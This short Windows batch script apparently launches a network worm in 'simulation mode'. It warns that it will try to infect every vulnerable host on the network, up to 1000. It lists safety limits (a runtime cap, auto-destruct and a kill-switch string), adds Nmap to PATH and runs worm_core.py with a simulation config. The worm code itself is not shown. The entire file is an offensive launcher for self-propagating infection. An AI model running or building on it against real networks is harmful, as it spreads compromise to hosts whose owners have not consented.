@echo off
REM Simulation Mode - Maximum Network Infection
REM This will attempt to infect the entire network

echo ============================================================
echo ML NETWORK WORM - SIMULATION MODE
echo ============================================================
echo.
echo WARNING: This will attempt to infect ALL vulnerable hosts
echo in the network (up to 1000 hosts).
echo.
echo Safety limits:
echo - Max infections: 1000
echo - Max runtime: 2 hours
echo - Auto-destruct: 2 hours
echo - Kill switch: EMERGENCY_STOP_SIMULATION
echo.
echo ============================================================
echo.

pause

REM Add Nmap to PATH
set PATH=%PATH%;C:\Program Files (x86)\Nmap

echo Starting simulation...
echo.

python worm_core.py --config config_simulation.yaml

echo.
echo ============================================================
echo Simulation complete!
echo ============================================================
pause
